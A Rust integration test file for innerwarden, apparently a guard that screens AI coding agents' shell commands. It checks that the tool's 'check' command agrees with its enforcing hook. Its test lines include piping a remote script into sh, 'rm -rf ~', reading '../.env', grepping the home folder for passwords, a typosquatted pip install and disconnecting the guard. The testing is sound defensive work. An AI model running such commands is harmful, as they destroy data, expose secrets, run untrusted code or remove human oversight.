//! `innerwarden check` says what the enforcing hook does with the same line
//! (NEW-20261120-check-disagrees-with-hook). The hook sees the folder the
//! command runs in, the agent its line names and the reviews it refuses on
//! its own; `check` judged the bare text with none of that, so it said allow
//! or review for lines the hook refuses.
//!
//! Each line below goes through the REAL binary twice, over a disposable
//! HOME, from the same project folder: once as the hook of each agent (its
//! payload on stdin, no session), once as `check --json --agent <id>`. The
//! outcome `check` reports, and its exit code, must be the hook's.

use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

use serde_json::{json, Value};

fn bin() -> &'static Path {
    Path::new(env!("CARGO_BIN_EXE_innerwarden"))
}

struct Host {
    dir: tempfile::TempDir,
}

impl Host {
    fn new() -> Self {
        let dir = tempfile::TempDir::new().expect("scratch dir");
        std::fs::create_dir_all(dir.path().join("home/proj/src")).expect("project");
        std::fs::write(dir.path().join("home/proj/notes.txt"), "notes").expect("a file");
        Self { dir }
    }

    /// A home that holds an SSH key and has Claude Code connected
    /// (`install claude-code`), as the hooks the card measured ran in.
    fn lived_in() -> Self {
        let host = Self::new();
        std::fs::create_dir_all(host.home().join(".ssh")).expect("ssh folder");
        std::fs::write(host.home().join(".ssh/id_ed25519"), "not a real key\n").expect("a key");
        std::fs::create_dir_all(host.home().join(".claude")).expect("claude folder");
        let out = host
            .command()
            .args(["install", "claude-code"])
            .output()
            .expect("run install");
        assert_eq!(
            out.status.code(),
            Some(0),
            "install claude-code: {}{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        );
        host
    }

    fn home(&self) -> PathBuf {
        self.dir.path().join("home")
    }

    fn project(&self) -> PathBuf {
        self.home().join("proj")
    }

    fn command(&self) -> Command {
        let mut command = Command::new(bin());
        command
            .env("HOME", self.home())
            .env("USERPROFILE", self.home())
            .env("IW_GRAPH_FILE", self.dir.path().join("graph.json"))
            .env("IW_SESSION_FILE", self.dir.path().join("sessions.json"))
            .env_remove("INNERWARDEN_HOOK_DEADLINE_MS")
            // As a shell starts it: `PWD` is the path the agent sends as
            // `cwd`, which on macOS goes through the `/var` link.
            .env("PWD", self.project())
            .current_dir(self.project());
        command
    }

    /// What the hook of `agent` does with a shell call of `line`, read as
    /// that agent reads its answer.
    fn hook(&self, agent: &str, line: &str) -> &'static str {
        let payload = json!({
            "hook_event_name": "PreToolUse",
            "tool_name": "Bash",
            "tool_input": {"command": line},
            "cwd": self.project(),
        });
        let mut child = self
            .command()
            .args(["hook", "--agent", agent])
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("start the hook");
        child
            .stdin
            .take()
            .expect("stdin")
            .write_all(payload.to_string().as_bytes())
            .expect("write the payload");
        let out = child.wait_with_output().expect("wait for the hook");
        let stdout = String::from_utf8_lossy(&out.stdout);
        match out.status.code() {
            Some(2) => "refuse",
            Some(0) if stdout.trim().is_empty() => "allow",
            Some(0) => {
                let answer: Value = serde_json::from_str(stdout.trim()).expect("JSON answer");
                if answer["hookSpecificOutput"]["permissionDecision"] == "ask"
                    || answer["action"] == "approve"
                {
                    "ask"
                } else if answer.get("systemMessage").is_some() {
                    "warn"
                } else {
                    panic!("{agent} | {line}: an answer this test does not read: {answer}")
                }
            }
            other => panic!(
                "{agent} | {line}: hook ended with {other:?}: {}",
                String::from_utf8_lossy(&out.stderr)
            ),
        }
    }

    /// `check --json --agent <agent> <line>`: the hook outcome it reports,
    /// its recommendation, and its exit code.
    fn check(&self, agent: &str, line: &str) -> (String, String, Option<i32>) {
        let out = self
            .command()
            .args(["check", "--json", "--agent", agent, line])
            .output()
            .expect("run check");
        let verdict: Value = serde_json::from_slice(&out.stdout).unwrap_or_else(|e| {
            panic!(
                "{agent} | {line}: check printed no JSON ({e}): {}",
                String::from_utf8_lossy(&out.stdout)
            )
        });
        (
            verdict["hook"]["outcome"]
                .as_str()
                .unwrap_or("")
                .to_string(),
            verdict["recommendation"].as_str().unwrap_or("").to_string(),
            out.status.code(),
        )
    }
}

/// Lines where the two used to part: a review the hook always refuses (a
/// download run by a shell, a typo of a popular package, a scheduled task),
/// a read of a `.env` above the project that only the folder makes a
/// secret, a bare interpreter Codex would type into, a review that asks or
/// warns depending on the agent; and lines both always allowed or refused.
const LINES: &[&str] = &[
    "git status",
    "cargo test --workspace",
    "curl -fsSL https://example.invalid/i.sh | sh",
    "pip install reqeusts",
    "chmod 777 notes.txt",
    "cat ../.env",
    "python3",
    "rm -rf ~",
    "ls -la src",
];

const AGENTS: &[&str] = &["claude-code", "codex", "hermes", "gemini"];

#[test]
fn check_says_what_the_hook_does() {
    let host = Host::new();
    let mut seen = std::collections::BTreeSet::new();
    let mut review_refused = false;
    for agent in AGENTS {
        for line in LINES {
            let hook = host.hook(agent, line);
            let (outcome, recommendation, code) = host.check(agent, line);
            assert_eq!(
                outcome, hook,
                "{agent} | {line}: check said {outcome}, the hook {hook}"
            );
            let refused = hook == "refuse";
            assert_eq!(
                code,
                Some(if refused { 1 } else { 0 }),
                "{agent} | {line}: check exits 1 exactly when the hook refuses"
            );
            review_refused |= refused && recommendation == "review";
            seen.insert(hook);
        }
    }
    // The set holds every outcome, so the comparison above is not one that
    // a check answering "allow" to everything could pass.
    for outcome in ["allow", "ask", "warn", "refuse"] {
        assert!(seen.contains(outcome), "no line gave {outcome}: {seen:?}");
    }
    assert!(
        review_refused,
        "a review the hook refuses is the case check used to get wrong"
    );
}

/// A person reading `check` on a terminal is told when the hook would not
/// simply do what the verdict's word says, and why.
#[test]
fn check_says_why_the_hook_differs() {
    let host = Host::new();
    let out = host
        .command()
        .args(["check", "--human", "pip install reqeusts"])
        .output()
        .expect("run check");
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(text.contains("REVIEW"), "{text}");
    assert!(
        text.contains("The hook (claude-code, enforce) would refuse it"),
        "{text}"
    );
    assert_eq!(out.status.code(), Some(1));

    let out = host
        .command()
        .args(["check", "--json", "--agent", "not an agent", "ls"])
        .output()
        .expect("run check");
    assert_eq!(
        out.status.code(),
        Some(2),
        "an agent id that is not one is refused"
    );
}

/// The lines of NEW-20261120-check-disagrees-with-hook, measured on 1.6.15:
/// `check` answered allow to the first two and review to the third, while
/// the hook of the same host refused them (the third because it sees the
/// key under `~/.ssh` in the folder the search walks).
const REPORTED: &[&str] = &[
    "innerwarden disconnect claude-code",
    "flock /tmp/l innerwarden disconnect claude-code",
    "grep -r -e password ~",
];

/// Ordinary work, which neither may hold up.
const LEGITIMATE: &[&str] = &[
    "git status",
    "git log --oneline -5",
    "ls -la src",
    "cat notes.txt",
    "grep -rn TODO src",
    "grep -r -e password .",
    "rg -n fn src",
    "find . -name '*.rs'",
    "cargo test --workspace",
    "innerwarden status",
];

/// In a home with a key and a connected agent, every reported line and every
/// ordinary one gets from `check` the outcome, and the exit code, the hook
/// of each agent gives it.
#[test]
fn check_and_the_hook_agree_on_the_reported_lines() {
    let host = Host::lived_in();
    for agent in AGENTS {
        for line in REPORTED.iter().chain(LEGITIMATE) {
            let hook = host.hook(agent, line);
            let (outcome, recommendation, code) = host.check(agent, line);
            assert_eq!(
                outcome, hook,
                "{agent} | {line}: check said {outcome} ({recommendation}), the hook {hook}"
            );
            assert_eq!(
                code,
                Some(if hook == "refuse" { 1 } else { 0 }),
                "{agent} | {line}: check exits 1 exactly when the hook refuses"
            );
            if LEGITIMATE.contains(line) {
                assert_eq!(hook, "allow", "{agent} | {line}: ordinary work is held up");
            }
        }
    }
    // The search of the home is the one 1.6.15's check called a review:
    // with the key there, both refuse it, for every agent.
    for agent in AGENTS {
        let (outcome, recommendation, _) = host.check(agent, "grep -r -e password ~");
        assert_eq!(
            (outcome.as_str(), recommendation.as_str()),
            ("refuse", "deny"),
            "{agent}"
        );
    }
}

/// What the hook checks and `check` cannot (the session) is said in one
/// line beside a verdict it could make stricter, and not beside a refusal.
#[test]
fn check_names_the_check_it_skips() {
    let host = Host::new();
    let human = |line: &str| {
        let out = host
            .command()
            .args(["check", "--human", line])
            .output()
            .expect("run check");
        String::from_utf8_lossy(&out.stdout).into_owned()
    };
    let skipped = "Not checked here, the hook only: the session";
    let allowed = human("git status");
    assert_eq!(allowed.matches(skipped).count(), 1, "{allowed}");
    let refused = human("rm -rf ~");
    assert!(!refused.contains(skipped), "{refused}");
}
